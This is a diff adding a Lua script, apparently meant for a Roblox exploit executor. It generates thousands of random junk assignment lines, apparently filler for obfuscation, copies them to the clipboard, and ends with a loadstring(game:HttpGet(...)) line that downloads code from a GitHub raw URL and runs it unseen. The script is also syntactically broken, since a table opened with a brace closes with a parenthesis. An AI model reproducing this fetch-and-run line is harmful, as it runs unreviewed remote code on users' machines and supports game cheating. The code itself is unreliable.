@@ -1,0 +1,47 @@
+math.randomseed(os.time())
+local Characters = "abcdefgjklmnopqrstuvwxyz1234567890";
+
+local tChars = {  };
+for str in Characters:gmatch('[^.-*]') do
+    table.insert(tChars, str);
+end;
+Characters = tChars;tChars = nil;
+
+local function GetRandomCharacter(IgnoreCharacter, UL)
+    local Char = Characters[math.random(1, #Characters)];
+    
+    if IgnoreCharacter then
+        while Char == IgnoreCharacter do
+            Char = Characters[math.random(1, #Characters)];
+        end
+    end;
+    
+    if UL then
+        Char = (math.random(0, 1) == 0) and Char:lower() or Char:upper();
+    end;
+    
+    return Char;
+end;
+
+local function GenerateString(Length)
+    local String = {}
+    local Recent;
+    for i = 1, Length do
+        local char = GetRandomCharacter(Recent, true);
+        table.insert(String, char);
+        Recent = char;
+    end;
+    
+    return table.concat(String, '');
+end;
+
+
+numberoffakes = 2000
+local fakes = {GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50), GenerateString(50))
+faked = {}
+for i = 1,numberoffakes do
+table.insert(faked, "a34534345 = '" ..tostring(fakes[math.random(1,#fakes)]).."'")
+end
+setclipboard(table.concat(faked,'\n')) -- the table.concat part is skidded from sowd, nothing else ok
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GoodB0y08/Sk1dW6r3.lua/main/cool-stuff/UI-Library.beta.lua"))(";======;")
